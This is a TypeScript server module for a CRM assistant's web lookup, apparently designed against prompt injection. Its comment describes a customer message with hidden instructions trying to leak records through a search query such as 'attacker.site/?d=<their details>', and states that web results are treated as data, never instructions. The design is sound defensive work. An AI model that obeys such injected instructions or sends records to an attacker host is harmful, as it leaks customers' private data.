import "server-only";
import { codexRespond } from "./codex";
import { safeCodexError } from "./codexErrors";
import { logError } from "./errorLog";
import { stripInvisible } from "./invisibleText";
import { WEB_INSTRUCTIONS, webResult } from "./crmAssistantWebRules";

/**
 * The assistant's internet search — owner-switched, and built so it can't be
 * used to leak the CRM.
 *
 * THE ONE RULE: this step sees ONLY the question the person typed. Not the CRM
 * results, not the conversation, not what it has learned, not an attached image.
 * The research step can only ASK for a web lookup ({"tool":"web"} carries no
 * arguments — one bit), it can't say what to search for. So a customer's
 * message with hidden instructions, read in a lead brief, has no way to put a
 * record into a search query ("search attacker.site/?d=<their details>") —
 * the query is written from the person's own words, by a call that has never
 * seen a record.
 *
 * What comes back is public web text: cleaned, fenced with the other results
 * and treated as data (never instructions), and the answer names its sources.
 * Off for scheduled runs; counted against its own per-person hourly limit.
 */
export async function webLookup(question: string): Promise<{ data: unknown[] }> {
  const reply = await codexRespond({
    instructions: WEB_INSTRUCTIONS,
    prompt: `Question: ${stripInvisible(question).slice(0, 500)}`,
    webSearch: true,
    reasoningEffort: "low",
    timeoutMs: 60_000,
  });
  if ("error" in reply) {
    await logError("crm-assistant", "web lookup failed", safeCodexError(reply.error));
    return { data: [{ note: "The internet search didn't work just now — say so if it matters." }] };
  }
  return webResult(reply.text);
}
